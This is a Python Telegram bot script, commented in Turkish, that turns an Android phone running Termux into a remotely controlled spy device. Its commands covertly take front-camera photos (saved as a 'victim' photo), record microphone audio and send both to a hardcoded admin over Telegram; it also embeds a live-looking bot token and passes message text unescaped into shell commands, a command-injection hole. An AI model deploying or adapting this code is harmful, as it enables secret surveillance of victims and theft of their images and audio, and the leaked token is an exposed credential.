import telebot
import os
import time

# --- AYARLAR ---
TOKEN = "7877070983:AAHjjOvYZAaxmdooD_Jaz6oXvXEi1gSgicg"
ADMIN_ID = "7565769066" 

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def welcome(message):
    if str(message.chat.id) == ADMIN_ID:
        komutlar = (
            "🚀 Sistem Aktif Sahip!\n\n"
            "/foto - Ön kameradan gizlice foto çeker\n"
            "/ses - 5 saniye ses kaydı alır\n"
            "/titret - Telefonu zırıldatır\n"
            "/oku [mesaj] - Yazdığını sesli okur\n"
            "/yaz [mesaj] - Ekranda uyarı çıkar"
        )
        bot.reply_to(message, komutlar)

@bot.message_handler(commands=['foto'])
def take_photo(message):
    if str(message.chat.id) == ADMIN_ID:
        bot.reply_to(message, "📸 Görüntü alınıyor...")
        os.system("termux-camera-photo -c 1 kurban_foto.jpg")
        time.sleep(2)
        with open("kurban_foto.jpg", "rb") as f:
            bot.send_photo(message.chat.id, f)

@bot.message_handler(commands=['ses'])
def record_audio(message):
    if str(message.chat.id) == ADMIN_ID:
        bot.reply_to(message, "🎤 5 saniye ses kaydediliyor...")
        os.system("termux-microphone-record -d 5 ses_kaydi.mp3")
        time.sleep(6)
        with open("ses_kaydi.mp3", "rb") as f:
            bot.send_audio(message.chat.id, f)

@bot.message_handler(commands=['titret'])
def vibrate(message):
    if str(message.chat.id) == ADMIN_ID:
        os.system("termux-vibrate -d 3000")
        bot.reply_to(message, "📳 Cihaz titretildi!")

@bot.message_handler(commands=['oku'])
def speak(message):
    if str(message.chat.id) == ADMIN_ID:
        metin = message.text.replace('/oku ', '')
        os.system(f"termux-tts-speak '{metin}'")
        bot.reply_to(message, f"🗣️ '{metin}' okundu.")

@bot.message_handler(commands=['yaz'])
def toast(message):
    if str(message.chat.id) == ADMIN_ID:
        metin = message.text.replace('/yaz ', '')
        os.system(f"termux-toast '{metin}'")
        bot.reply_to(message, "📱 Ekrana yazıldı.")

bot.polling()
      
